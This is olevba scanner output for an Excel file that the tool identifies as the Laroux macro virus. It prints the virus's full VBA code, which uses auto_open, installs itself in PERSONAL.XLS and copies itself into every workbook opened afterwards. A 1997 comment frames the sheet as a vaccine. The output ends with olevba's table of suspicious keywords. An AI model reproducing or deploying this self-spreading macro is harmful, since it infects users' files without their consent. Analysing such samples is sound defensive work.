olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-067fffb6c62ee93990262bdff5227b0e340f0772
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSExcel.Laroux-based-067fffb6c62ee93990262bdff5227b0e340f0772 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
'WARNING: This sheet contains the destructed body of
'selfspreading macro called "laroux". It is necessary
'to keep this sheet as a first sheet in your PERSONAL.XLS
'workbook to prevent spreading this virus across all Excel's
'workbooks (files) in your computer!
'As you can see below, first of all "laroux" is trying to put
'itself in PERSONAL.XLS. If PERSONAL.XLS does not exist "laroux"
'will create it in Excel's start up directory and put itself inside.
'Once infected PERSONAL.XLS will put "laroux" macro into all
'workbooks you will pick up in to Excel! But if "laroux" will
'see its name at the first sheet in the workbook it will not try
'to infect it again.
'
'
'There is a DOS-programm called "F-Macro". It works not correct with
'infected files. Be cautious. May be better to leave viruses than to
'lose any workbook you are need.
'Remember: "laroux" does not contain any destruction finction.
'
'So, I have got the macro named "check_laroux". It is on the next
'sheet in this work book, I mean "protect" sheet. This macro will
'check if "laroux" sheet exist in all workbooks you will open or
'create in future. If "laroux" will be found "check_laroux" will kill it.
'You will be told if it happend. In sheet named "List" you can see the
'list of files where "laroux" was killed.
'WARNING: Do not let to kill false "laroux" sheet in PERSONAL.XLS workbook.
'
'Put this PERSONAL.XLS file in to your Excel's start up directory
'or merge it with your own PERSONAL.XLS (but remember: sheet "laroux"
'has to be first sheet in PERSONAL.XLS) and it will keep you out of
'spreading "laroux" macro.
'
'Sorry, if my English is not very well. Good luck. Vladimir Popov.
's/v ORIENT EXPLORER PGS Exploration. 22.02.97.
'
'
'------------------------------------------------here is body of "laroux"-
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "laroux" Then
        Workbooks("PERSONAL.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("laroux").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  larou
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |.+-                 |List                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

